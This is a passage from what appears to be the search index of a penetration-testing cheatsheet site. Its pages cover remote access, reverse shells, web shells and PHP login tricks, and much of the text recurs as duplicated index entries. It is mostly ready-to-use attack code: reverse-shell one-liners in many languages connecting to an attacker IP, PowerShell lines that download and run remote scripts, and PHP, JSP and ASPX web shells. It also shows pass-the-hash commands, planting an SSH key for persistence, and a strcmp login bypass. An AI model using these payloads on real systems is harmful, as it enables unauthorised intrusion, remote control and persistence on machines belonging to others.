/NODE:10.0.0.1 service get \"startname,pathname\" Scheduled Tasks Port: 135/TCP (RPC), High TCP (DCOM) Tools: atexec (Impacket) atexec.py user@target_ip -hashes LM:NT Changing user context for cmd In a cmd interactive session runas runas /netonly /user:domain\\user \"powershell.exe\" psexec PsExec.exe -u user -p pass -i cmd.exe From Powershell Invoke-Command $pass = ConvertTo-SecureString 'password' -AsPlainText -Force $cred = New-Object System . Management . Automation . PSCredential ( 'user' , $pass ) Invoke-Command -Computer COMPUTER -Credential $cred -ScriptBlock { command } #Example command: iex (New-Object Net.WebClient).DownloadString('bla/rev.ps1') Note If you are having problems with \"powershell double jump\" you can pass the -Authentication CredSSP to fix it. Adding kerberos config in linux Edit the /etc/krb5.conf adding the following (adapt): [realms] DOMAIN.LOCAL = { kdc = 10.0.0.1 } Get a ticket kinit user klist","title":"Remote Access"},{"location":"shells/remote/#remote-access","text":"Reverse shells are useful when you does not have credentials or you just exploited a service. Here are listed more methods to access remotely a machine.","title":"Remote access"},{"location":"shells/remote/#linux","text":"","title":"Linux"},{"location":"shells/remote/#ssh-dropping-a-key","text":"If you compromise a user and is a ssh capable user (check for a login shell in /etc/passwd), it is possible to get his ssh key in ~/.ssh/id_rsa if its located in the typical location. If there is no key, it is always possible to drop one with two simple commands: #Create the key ssh-keygen -f ./key #Accept all prompts cat ./key.pub #Copy the public key # In the victim machine echo 'ssh-rsa ...........' > ~/.ssh/authorized_keys # In your machine again chmod 600 key ssh -i key user@machine","title":"SSH + Dropping a key"},{"location":"shells/remote/#windows","text":"Below is a table used as a cheatsheet for different ways to connect remotely depending on open ports:","title":"Windows"},{"location":"shells/remote/#rdp","text":"Port: 3389 Tools Microsoft RDP Client ( mstsc.exe ) mstsc.exe /v:hostname:port /admin XFreeRDP: xfreerdp /u:user /d:domain /pth:<NTLM> /v:10.0.0.2 RDesktop: rdesktop -g 90% 10.0.0.1","title":"RDP"},{"location":"shells/remote/#smb","text":"Quote SMB has been leveraged for file administration on Windows and *nix systems for decades. Another feature often abused by attackers is the use of administrative shares (C$, ADMIN$, IPC$) to push a service binary to a target machine, then start the service for semi-interactive I/O. SysInternalsSuite includes the PsExec binary which is largely credited for developing and leveraging this technique. Local administrative privileges are required to push the service binary to the ADMIN$ share, after which an RPC/SVCCTL call creates and starts the remote control service. IPC$ is leveraged to create named pipes for input and output which act as a semi-interactive shell. Credit: https://dolosgroup.io/blog/remote-access-cheat-sheet Port: 445 Tools PsExec.exe \\\\10.0.0.1 -u user -p pass cmd.exe psexec.py 'user':'pass'@10.0.0.1 cmd.exe smbexec.py 'user':'pass'@10.0.0.1 cmd.exe winexe --system --uninstall -U domain/user%pass //10.0.0.1 cmd.exe Info If Credentials with administrative privileges are provided, it is possible to spawn a shell with NT Authority\\System user passing the -s flag to PsExec.exe Also if you are doing this in an interactive command prompt, you could also pass the -i flag to interact with the created process.","title":"SMB"},{"location":"shells/remote/#winrm","text":"Port: 5985/TCP (HTTP), 5986/TCP (HTTPS) Tools evil-winrm Normal login evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' Cert Login evil-winrm -i 10.0.0.1 -c user.crt -k user.key Info It is needed to use -S flag if you are connecting to a HTTPS Endpoint From Windows Machine New-PSSession -Computer IP -Authentication Negotiate -Credential USER | Enter-PSSession In the section changing user context a method to create a Credential object is explained.","title":"WinRM"},{"location":"shells/remote/#wmi","text":"Port: 135/TCP (RPC), High TCP (DCOM) Tools Impacket-wmiexec Normal wmiexec.py domain/user:pass@target_ip Pass the hash wmiexec.py user@target_ip -hashes LM:NT wmic.exe wmic.exe /USER:\"domain\\user\" /PASSWORD:\"Password\" /NODE:10.0.0.1 service get \"startname,pathname\"","title":"WMI"},{"location":"shells/remote/#scheduled-tasks","text":"Port: 135/TCP (RPC), High TCP (DCOM) Tools: atexec (Impacket) atexec.py user@target_ip -hashes LM:NT","title":"Scheduled Tasks"},{"location":"shells/remote/#changing-user-context-for-cmd","text":"In a cmd interactive session runas runas /netonly /user:domain\\user \"powershell.exe\" psexec PsExec.exe -u user -p pass -i cmd.exe From Powershell Invoke-Command $pass = ConvertTo-SecureString 'password' -AsPlainText -Force $cred = New-Object System . Management . Automation . PSCredential ( 'user' , $pass ) Invoke-Command -Computer COMPUTER -Credential $cred -ScriptBlock { command } #Example command: iex (New-Object Net.WebClient).DownloadString('bla/rev.ps1') Note If you are having problems with \"powershell double jump\" you can pass the -Authentication CredSSP to fix it.","title":"Changing user context for cmd"},{"location":"shells/remote/#adding-kerberos-config-in-linux","text":"Edit the /etc/krb5.conf adding the following (adapt): [realms] DOMAIN.LOCAL = { kdc = 10.0.0.1 } Get a ticket kinit user klist","title":"Adding kerberos config in linux"},{"location":"shells/reverse/","text":"Reverse shells Compendium of reverse shells. Linux and OS agnostic reverse shells Bash bash -i > & /dev/tcp/10.0.0.1/8080 0 > & 1 Info Sometimes is not possible to put spaces in the payload. ${IFS} can be used as a separator on linux systems. Python import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.0.0.1\" , 1234 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \"/bin/sh\" , \"-i\" ]); This will be executed if you are injecting this code into a python execution context. In case we need to do it from a shell, you can prepend python -c 'payload' Warning It is possible that if you are executing this into a shell (eg. Bash) can assume that python is not installed if the execution fails. Try python3 for example, it could be only installed under this name. Alternative Method: import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.0.0.1\" , 4242 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); import pty ; pty . spawn ( \"/bin/bash\" ) PHP $sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\"); Or prepending php -r 'payload' if we executing this from a shell context. Netcat nc -e /bin/sh 10 .0.0.1 1234 Info This will only work on systems that have the \"insecure\" version of netcat installed. The -e functionality its usually disabled. Sometimes can be found in nc.traditional program if it is installed. In case Netcat is installed but without the -e flag, you can do the following (FIFO pipes shell) rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2 > & 1 | nc 10 .0.0.1 4242 >/tmp/f Socat Attacker: socat file: ` tty ` ,raw,echo = 0 TCP-L:4242 Victim: /tmp/socat exec: 'bash -li' ,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 Lua local host , port = \"10.0.0.1\" , 4242 local socket = require ( \"socket\" ) local tcp = socket . tcp () local io = require ( \"io\" ) tcp : connect ( host , port ); while true do local cmd , status , partial = tcp : receive () local f = io.popen ( cmd , \"r\" ) local s = f : read ( \"*a\" ) f : close () tcp : send ( s ) if status == \"closed\" then break end end tcp : close () Node JS require ( 'child_process' ). exec ( 'nc -e /bin/sh 10.0.0.1 4242' ) Perl perl - e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' Groovy String host = \"localhost\" ; int port = 8044 ; String cmd = \"cmd.exe\" ; Process p = new ProcessBuilder ( cmd ). redirectErrorStream ( true ). start (); Socket s = new Socket ( host , port ); InputStream pi = p . getInputStream (), pe = p . getErrorStream (), si = s . getInputStream (); OutputStream po = p . getOutputStream (), so = s . getOutputStream (); while (! s . isClosed ()){ while ( pi . available ()> 0 ) so . write ( pi . read ()); while ( pe . available ()> 0 ) so . write ( pe . read ()); while ( si . available ()> 0 ) po . write ( si . read ()); so . flush (); po . flush (); Thread . sleep ( 50 ); try { p . exitValue (); break ;} catch ( Exception e ){}}; p . destroy (); s . close (); Hint Useful when exploiting Jenkins. If your Jenkins privileges let you to access groovy console (Tipically found at /script on jenkins GUI) it is possible to use this reverse shell to get RCE. Windows reverse shells Windows by default could use any of the above shells if there is present any of the languages. If not, a typical approach is going with Powershell. Nishang Nishang Github Quote Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. In memory execution: iex ( New-Object Net . WebClient ). DownloadString ( 'http://<yourwebserver>/Invoke-PowerShellTcp.ps1' ); Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] You can also add in the file the last line Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] to the script and do the same function in one command. Powershell One-Liner: $client = New-Object System . Net . Sockets . TCPClient ( '10.0.0.1' , 4444 ); $stream = $client . GetStream (); [byte[]] $bytes = 0 .. 65535 |%{ 0 }; while (( $i = $stream . Read ( $bytes , 0 , $bytes . Length )) -ne 0 ){; $data = ( New-Object -TypeName System . Text . ASCIIEncoding ). GetString ( $bytes , 0 , $i ); $sendback = ( iex $data 2 >& 1 | Out-String ); $sendback2 = $sendback + 'PS ' + ( pwd ). Path + '> ' ; $sendbyte = ( [text.encoding] :: ASCII ). GetBytes ( $sendback2 ); $stream . Write ( $sendbyte , 0 , $sendbyte . Length ); $stream . Flush ()}; $client . Close () ConPty Github IEX ( IWR https : // raw . githubusercontent . com / antonioCoco / ConPtyShell / master / Invoke-ConPtyShell . ps1 ); Invoke-ConPtyShell 10 . 0 . 0 . 2 3001 Note Fully interactive shell, but needs Rows and Cols. As noted on the repo, it is possible to avoid setting these params if the listener is started like this: stty raw -echo; (stty size; cat) | nc -lvnp 3001 Warning Requirements: Client Side: Windows version >= 10 / 2019 1809 (build >= 10.0.17763) General tricks and upgrading the shell When catching reverse shells with netcat on a port (e.g. using nc -lvnp 4444 ) you can find a lot of times that is hard to edit commands if you make a typo or whatever. This is due to losing access to some \"terminal enhancers\" we have on default shell session in our machine. One of them is ReadLine that allow you to edit your commands or use your arrow keys to rotate between them. It is possible to replicate that functionality into the reverse shell prepending the listening shell with rlwrap . Example: rlwrap nc -lvnp 1234 Another improvement for the shell could be putting the \"host\" shell on raw mode to use keyboard shortcuts or editor programs on your reverse shell. That can be achieved doing the following: ctrl+z echo $TERM && tput lines && tput cols # for bash stty raw -echo fg # for zsh stty raw -echo ; fg reset export SHELL = bash export TERM = xterm-256color stty rows <num> columns <cols> Note the detail on zsh. The motivation behind doing the trick different resides on this information taken from PayloadsAllTheThings repo: Quote The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect References Pentest Monkey PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Groovy Shell https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76","title":"Reverse Shells"},{"location":"shells/reverse/#reverse-shells","text":"Compendium of reverse shells.","title":"Reverse shells"},{"location":"shells/reverse/#linux-and-os-agnostic-reverse-shells","text":"","title":"Linux and OS agnostic reverse shells"},{"location":"shells/reverse/#bash","text":"bash -i > & /dev/tcp/10.0.0.1/8080 0 > & 1 Info Sometimes is not possible to put spaces in the payload. ${IFS} can be used as a separator on linux systems.","title":"Bash"},{"location":"shells/reverse/#python","text":"import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.0.0.1\" , 1234 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); p = subprocess . call ([ \"/bin/sh\" , \"-i\" ]); This will be executed if you are injecting this code into a python execution context. In case we need to do it from a shell, you can prepend python -c 'payload' Warning It is possible that if you are executing this into a shell (eg. Bash) can assume that python is not installed if the execution fails. Try python3 for example, it could be only installed under this name. Alternative Method: import socket , subprocess , os ; s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ); s . connect (( \"10.0.0.1\" , 4242 )); os . dup2 ( s . fileno (), 0 ); os . dup2 ( s . fileno (), 1 ); os . dup2 ( s . fileno (), 2 ); import pty ; pty . spawn ( \"/bin/bash\" )","title":"Python"},{"location":"shells/reverse/#php","text":"$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\"); Or prepending php -r 'payload' if we executing this from a shell context.","title":"PHP"},{"location":"shells/reverse/#netcat","text":"nc -e /bin/sh 10 .0.0.1 1234 Info This will only work on systems that have the \"insecure\" version of netcat installed. The -e functionality its usually disabled. Sometimes can be found in nc.traditional program if it is installed. In case Netcat is installed but without the -e flag, you can do the following (FIFO pipes shell) rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2 > & 1 | nc 10 .0.0.1 4242 >/tmp/f","title":"Netcat"},{"location":"shells/reverse/#socat","text":"Attacker: socat file: ` tty ` ,raw,echo = 0 TCP-L:4242 Victim: /tmp/socat exec: 'bash -li' ,pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242","title":"Socat"},{"location":"shells/reverse/#lua","text":"local host , port = \"10.0.0.1\" , 4242 local socket = require ( \"socket\" ) local tcp = socket . tcp () local io = require ( \"io\" ) tcp : connect ( host , port ); while true do local cmd , status , partial = tcp : receive () local f = io.popen ( cmd , \"r\" ) local s = f : read ( \"*a\" ) f : close () tcp : send ( s ) if status == \"closed\" then break end end tcp : close ()","title":"Lua"},{"location":"shells/reverse/#node-js","text":"require ( 'child_process' ). exec ( 'nc -e /bin/sh 10.0.0.1 4242' )","title":"Node JS"},{"location":"shells/reverse/#perl","text":"perl - e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'","title":"Perl"},{"location":"shells/reverse/#groovy","text":"String host = \"localhost\" ; int port = 8044 ; String cmd = \"cmd.exe\" ; Process p = new ProcessBuilder ( cmd ). redirectErrorStream ( true ). start (); Socket s = new Socket ( host , port ); InputStream pi = p . getInputStream (), pe = p . getErrorStream (), si = s . getInputStream (); OutputStream po = p . getOutputStream (), so = s . getOutputStream (); while (! s . isClosed ()){ while ( pi . available ()> 0 ) so . write ( pi . read ()); while ( pe . available ()> 0 ) so . write ( pe . read ()); while ( si . available ()> 0 ) po . write ( si . read ()); so . flush (); po . flush (); Thread . sleep ( 50 ); try { p . exitValue (); break ;} catch ( Exception e ){}}; p . destroy (); s . close (); Hint Useful when exploiting Jenkins. If your Jenkins privileges let you to access groovy console (Tipically found at /script on jenkins GUI) it is possible to use this reverse shell to get RCE.","title":"Groovy"},{"location":"shells/reverse/#windows-reverse-shells","text":"Windows by default could use any of the above shells if there is present any of the languages. If not, a typical approach is going with Powershell.","title":"Windows reverse shells"},{"location":"shells/reverse/#nishang","text":"Nishang Github Quote Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. In memory execution: iex ( New-Object Net . WebClient ). DownloadString ( 'http://<yourwebserver>/Invoke-PowerShellTcp.ps1' ); Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] You can also add in the file the last line Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.] to the script and do the same function in one command. Powershell One-Liner: $client = New-Object System . Net . Sockets . TCPClient ( '10.0.0.1' , 4444 ); $stream = $client . GetStream (); [byte[]] $bytes = 0 .. 65535 |%{ 0 }; while (( $i = $stream . Read ( $bytes , 0 , $bytes . Length )) -ne 0 ){; $data = ( New-Object -TypeName System . Text . ASCIIEncoding ). GetString ( $bytes , 0 , $i ); $sendback = ( iex $data 2 >& 1 | Out-String ); $sendback2 = $sendback + 'PS ' + ( pwd ). Path + '> ' ; $sendbyte = ( [text.encoding] :: ASCII ). GetBytes ( $sendback2 ); $stream . Write ( $sendbyte , 0 , $sendbyte . Length ); $stream . Flush ()}; $client . Close ()","title":"Nishang"},{"location":"shells/reverse/#conpty","text":"Github IEX ( IWR https : // raw . githubusercontent . com / antonioCoco / ConPtyShell / master / Invoke-ConPtyShell . ps1 ); Invoke-ConPtyShell 10 . 0 . 0 . 2 3001 Note Fully interactive shell, but needs Rows and Cols. As noted on the repo, it is possible to avoid setting these params if the listener is started like this: stty raw -echo; (stty size; cat) | nc -lvnp 3001 Warning Requirements: Client Side: Windows version >= 10 / 2019 1809 (build >= 10.0.17763)","title":"ConPty"},{"location":"shells/reverse/#general-tricks-and-upgrading-the-shell","text":"When catching reverse shells with netcat on a port (e.g. using nc -lvnp 4444 ) you can find a lot of times that is hard to edit commands if you make a typo or whatever. This is due to losing access to some \"terminal enhancers\" we have on default shell session in our machine. One of them is ReadLine that allow you to edit your commands or use your arrow keys to rotate between them. It is possible to replicate that functionality into the reverse shell prepending the listening shell with rlwrap . Example: rlwrap nc -lvnp 1234 Another improvement for the shell could be putting the \"host\" shell on raw mode to use keyboard shortcuts or editor programs on your reverse shell. That can be achieved doing the following: ctrl+z echo $TERM && tput lines && tput cols # for bash stty raw -echo fg # for zsh stty raw -echo ; fg reset export SHELL = bash export TERM = xterm-256color stty rows <num> columns <cols> Note the detail on zsh. The motivation behind doing the trick different resides on this information taken from PayloadsAllTheThings repo: Quote The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect","title":"General tricks and upgrading the shell"},{"location":"shells/reverse/#references","text":"Pentest Monkey PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Groovy Shell https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76","title":"References"},{"location":"shells/webshells/","text":"WebShells When you exploit a web service or you have a file upload with file execution. PHP Simple PHP webshell code <?php system ( $_REQUEST [ 'variable' ]); ?> Info What the $_REQUEST does is accept the parameter from GET or POST request. It can be adapted to POST or GET if it is needed specifically for the exploit. JSP Simple JSP webshell code <%@ page import = \"java.util.*,java.io.*\" %> <HTML><BODY> <FORM METHOD= \"GET\" NAME= \"form1\" ACTION= \"\" > <INPUT TYPE= \"text\" NAME= \"variable\" > <INPUT TYPE= \"submit\" VALUE= \"Send\" > </FORM> <pre> <% if ( request . getParameter ( \"variable\" ) != null ) { Process prc = Runtime . getRuntime (). exec ( request . getParameter ( \"variable\" )); InputStream ins = prc . getInputStream (); OutputStream oss = prc . getOutputStream (); DataInputStream datastr = new DataInputStream ( ins ); String str = datastr . readLine (); out . println ( \"Input: \" + request . getParameter ( \"variable\" ) + \"<BR>\" ); while ( str != null ) { out . println ( str ); str = datastr . readLine (); } } %> </pre> </BODY></HTML> ASPX Simple ASPX webshell code <% @ Page Language = \"C#\" Debug = \"true\" Trace = \"false\" %> <% @ Import Namespace = \"System.Diagnostics\" %> <% @ Import Namespace = \"System.IO\" %> < script Language = \"c#\" runat = \"server\" > void Page_Load ( object sender , EventArgs e ) { } string ExAttr ( string params ) { ProcessStartInfo procstarti = new ProcessStartInfo (); procstarti . FileName = \"cmd\" + \".exe\" ; procstarti . Arguments = \"/c \" + params ; procstarti . RedirectStandardOutput = true ; procstarti . UseShellExecute = false ; Process proc = Process . Start ( procstarti ); StreamReader strrdr = proc . StandardOutput ; string str = strrdr . ReadToEnd (); strrdr . Close (); return str ; } void Args_Click ( object sender , System . EventArgs e ) { Response . Write ( \"<pre>\" ); Response . Write ( Server . HtmlEncode ( ExAttr ( text . Text ))); Response . Write ( \"</pre>\" ); } </ script > < HTML > < HEAD > < title > My Little Pony </ title > </ HEAD > < body > < form id = \"cmd\" method = \"post\" runat = \"server\" > < asp : TextBox id = \"text\" style = \"Z-INDEX: 110; LEFT: 400px; POSITION: absolute; TOP: 20px\" runat = \"server\" Width = \"250px\" ></ asp : TextBox > < asp : Button id = \"but\" style = \"Z-INDEX: 112; LEFT: 675px; POSITION: absolute; TOP: 18px\" runat = \"server\" Text = \"excute\" OnClick = \"Args_Click\" ></ asp : Button > < asp : Label id = \"labtext\" style = \"Z-INDEX: 114; LEFT: 310px; POSITION: absolute; TOP: 22px\" runat = \"server\" > Args :</ asp : Label > </ form > </ body > </ HTML >","title":"Web Shells"},{"location":"shells/webshells/#webshells","text":"When you exploit a web service or you have a file upload with file execution.","title":"WebShells"},{"location":"shells/webshells/#php","text":"Simple PHP webshell code <?php system ( $_REQUEST [ 'variable' ]); ?> Info What the $_REQUEST does is accept the parameter from GET or POST request. It can be adapted to POST or GET if it is needed specifically for the exploit.","title":"PHP"},{"location":"shells/webshells/#jsp","text":"Simple JSP webshell code <%@ page import = \"java.util.*,java.io.*\" %> <HTML><BODY> <FORM METHOD= \"GET\" NAME= \"form1\" ACTION= \"\" > <INPUT TYPE= \"text\" NAME= \"variable\" > <INPUT TYPE= \"submit\" VALUE= \"Send\" > </FORM> <pre> <% if ( request . getParameter ( \"variable\" ) != null ) { Process prc = Runtime . getRuntime (). exec ( request . getParameter ( \"variable\" )); InputStream ins = prc . getInputStream (); OutputStream oss = prc . getOutputStream (); DataInputStream datastr = new DataInputStream ( ins ); String str = datastr . readLine (); out . println ( \"Input: \" + request . getParameter ( \"variable\" ) + \"<BR>\" ); while ( str != null ) { out . println ( str ); str = datastr . readLine (); } } %> </pre> </BODY></HTML>","title":"JSP"},{"location":"shells/webshells/#aspx","text":"Simple ASPX webshell code <% @ Page Language = \"C#\" Debug = \"true\" Trace = \"false\" %> <% @ Import Namespace = \"System.Diagnostics\" %> <% @ Import Namespace = \"System.IO\" %> < script Language = \"c#\" runat = \"server\" > void Page_Load ( object sender , EventArgs e ) { } string ExAttr ( string params ) { ProcessStartInfo procstarti = new ProcessStartInfo (); procstarti . FileName = \"cmd\" + \".exe\" ; procstarti . Arguments = \"/c \" + params ; procstarti . RedirectStandardOutput = true ; procstarti . UseShellExecute = false ; Process proc = Process . Start ( procstarti ); StreamReader strrdr = proc . StandardOutput ; string str = strrdr . ReadToEnd (); strrdr . Close (); return str ; } void Args_Click ( object sender , System . EventArgs e ) { Response . Write ( \"<pre>\" ); Response . Write ( Server . HtmlEncode ( ExAttr ( text . Text ))); Response . Write ( \"</pre>\" ); } </ script > < HTML > < HEAD > < title > My Little Pony </ title > </ HEAD > < body > < form id = \"cmd\" method = \"post\" runat = \"server\" > < asp : TextBox id = \"text\" style = \"Z-INDEX: 110; LEFT: 400px; POSITION: absolute; TOP: 20px\" runat = \"server\" Width = \"250px\" ></ asp : TextBox > < asp : Button id = \"but\" style = \"Z-INDEX: 112; LEFT: 675px; POSITION: absolute; TOP: 18px\" runat = \"server\" Text = \"excute\" OnClick = \"Args_Click\" ></ asp : Button > < asp : Label id = \"labtext\" style = \"Z-INDEX: 114; LEFT: 310px; POSITION: absolute; TOP: 22px\" runat = \"server\" > Args :</ asp : Label > </ form > </ body > </ HTML >","title":"ASPX"},{"location":"webapps/php/","text":"PHP Here are some tricks to try in PHP web applications. Type Juggling The following image shows the result of comparing types with the == operator. Resources Hacktricks Medium Blog Owasp PDF strcmp(): Vulnerable function Vulnerable code <?php if ( strcmp ( $_POST [ 'password' ], $PASS ) == 0 ) ?> In this comparison a string is expected (Default from HTTP), but we can send an empty array: password[]= in the form. Then the function strcmp(array(),$PASS) will return NULL As we seen in the image, NULL == 0 -> True Login bypass!","title":"PHP"},{"location":"webapps/php/#php","text":"Here are some tricks to try in PHP web applications.","title":"PHP"},{"location":"webapps/php/#type-juggling","text":"The following image shows the result of comparing types with the == operator.","title":"Type Juggling"},{"location":"webapps/php/#resources","text":"Hacktricks Medium Blog Owasp PDF","title":"Resources"},{"location":"webapps/php/#strcmp-vulnerable-function","text":"Vulnerable code <?php if ( strcmp ( $_POST [ 'password' ], $PASS ) == 0 ) ?> In this comparison a string is expected (Default from HTTP), but we can send an empty array: password[]= in the form. Then the function strcmp(array(),$PASS) will return NULL As we seen in the image, NULL == 0 -> True Login bypass!","title":"strcmp(): Vulnerable function"}]}